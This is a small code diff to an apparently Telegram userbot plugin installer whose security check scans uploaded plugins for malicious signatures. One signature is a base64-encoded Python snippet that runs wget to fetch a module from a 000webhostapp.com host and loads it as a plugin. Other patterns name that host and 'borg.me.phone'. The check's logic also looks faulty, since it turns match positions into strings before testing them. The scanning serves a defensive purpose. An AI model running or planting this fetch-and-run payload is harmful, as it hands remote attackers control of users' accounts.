@@ -78,6 +78,9 @@ async def install(event):
     dd = open(yo, "r")
     hmm = dd.read()
     dd.close()
+
+    """ In Case  """
+
     # pygments.highlight(f"{hmm}", Python3Lexer(), ImageFormatter(font_name="DejaVu Sans Mono", line_numbers=True), "yo.png")
     
     
@@ -89,7 +92,7 @@ async def install(event):
 
     # ddd  = img2text('plugin.png')
     # hmm = f"{ddd}"
-
+    """ Who know we can use upper one too """
     secureee = f"{hmm}"
     secure =  str(secureee.find("if event.fwd_from:"))
     second = str(secureee.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
@@ -107,10 +110,12 @@ async def install(event):
      
      
      ok =  str(opens.read())
+     
      sssss =  str(ok.find("if event.fwd_from:"))
      second = str(ok.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
      dd = str(ok.find("borg.me.phone"))
      sss = str(ok.find("000webhostapp.com"))   
+     opens.close()
      if sssss not in ok:
             await event.edit(f"**Alert**\n\n**Not a secure plugin can't install**") 
 
@@ -143,6 +148,7 @@ async def install(event):
     if sss in secureee:
         await event.edit(f"*Intruder**\n\n**Plugin for hacking {DEFAULTUSER}\nAborted**")
         return
+    
     if event.reply_to_msg_id:
         try:
             downloaded_file_name = (
